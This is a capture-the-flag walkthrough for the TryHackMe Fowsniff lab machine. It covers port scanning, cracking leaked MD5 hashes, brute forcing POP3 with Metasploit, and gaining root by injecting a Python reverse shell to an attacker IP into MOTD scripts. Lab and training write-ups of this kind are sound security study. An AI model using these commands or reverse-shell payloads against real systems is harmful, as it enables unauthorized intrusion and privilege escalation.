# Fowsniff CTF - Full Walkthrough

## Objective

Boot2Root machine involving:

* Enumeration
* OSINT
* Password cracking
* POP3 brute forcing
* SSH access
* Privilege escalation

---

# Step 1 - Deploy Machine

Deploy the machine from TryHackMe and wait for it to boot.

Target IP:

```bash
export IP=<TARGET_IP>
```

---

# Step 2 - Nmap Scan

Run a full port scan:

```bash
nmap -sC -sV -oN nmap.txt $IP
```

## Open Ports

| Port | Service |
| ---- | ------- |
| 22   | SSH     |
| 80   | HTTP    |
| 110  | POP3    |

---

# Step 3 - Enumerate Website

Open the website in browser:

```bash
http://$IP
```

The page mentions:

* Fowsniff Corp
* Possible employee leak

---

# Step 4 - Gather Public Information

Search online for:

```text
Fowsniff Corp pastebin
```

You will discover leaked employee information containing:

* Usernames
* Emails
* MD5 password hashes

Example usernames:

```text
baksteen
mustang
seina
```

---

# Step 5 - Crack MD5 Hashes

Use online hash crackers or john/hashcat.

Example:

```bash
hashcat -m 0 hashes.txt rockyou.txt
```

Or use:

* hashkiller
* crackstation

Recovered passwords include:

| User  | Password   |
| ----- | ---------- |
| seina | scoobydoo2 |

---

# Step 6 - Brute Force POP3 Login

Using Metasploit:

```bash
msfconsole
```

Use POP3 login scanner:

```bash
use auxiliary/scanner/pop3/pop3_login
```

Set options:

```bash
set RHOSTS <TARGET_IP>
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

Successful credential:

```text
Username: seina
Password: scoobydoo2
```

---

# Step 7 - Access POP3 Mailbox

Connect manually:

```bash
telnet $IP 110
```

Login:

```bash
USER seina
PASS scoobydoo2
```

List emails:

```bash
LIST
```

Read email:

```bash
RETR 1
```

---

# Step 8 - Discover Temporary SSH Password

Inside the email:

```text
Temporary Password:
S1ck3nBluff+secureshell
```

Sender username:

```text
baksteen
```

---

# Step 9 - SSH Login

Connect via SSH:

```bash
ssh baksteen@$IP
```

Password:

```text
S1ck3nBluff+secureshell
```

---

# Step 10 - Enumerate Privileges

Check groups:

```bash
id
```

You will notice membership in a group with write access to MOTD-related files.

Check permissions:

```bash
find / -group users 2>/dev/null
```

Interesting directory:

```bash
/etc/update-motd.d/
```

---

# Step 11 - Prepare Reverse Shell

Start listener on attacker machine:

```bash
nc -lvnp 1234
```

Python reverse shell:

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

---

# Step 12 - Inject Reverse Shell

Edit writable MOTD script:

```bash
nano /opt/cube/cube.sh
```

Paste reverse shell payload.

Now include the script inside MOTD execution directory:

```bash
echo "/opt/cube/cube.sh" >> /etc/update-motd.d/00-header
```

Make executable:

```bash
chmod +x /opt/cube/cube.sh
```

---

# Step 13 - Trigger Root Shell

Reconnect via SSH:

```bash
ssh baksteen@$IP
```

When MOTD executes, root runs the modified script.

Your listener receives:

```bash
root@fowsniff:/#
```

---

# Step 14 - Capture Root Flag

Navigate:

```bash
cd /root
ls
cat flag.txt
```

---

# Machine Summary

## Initial Access

* Website enumeration
* OSINT leak discovery
* MD5 cracking
* POP3 credential brute force

## Privilege Escalation

* Writable MOTD script
* Reverse shell injection
* Root execution through SSH login banner

---

# Useful Commands Summary

## Nmap

```bash
nmap -sC -sV $IP
```

## POP3 Manual Login

```bash
telnet $IP 110
USER seina
PASS scoobydoo2
```

## SSH

```bash
ssh baksteen@$IP
```

## Netcat Listener

```bash
nc -lvnp 1234
```

---

# Lessons Learned

* Always investigate leaked employee data
* Password reuse is dangerous
* POP3 services often expose weak credentials
* MOTD scripts can become privilege escalation vectors
* Writable scripts executed by root are critical vulnerabilities
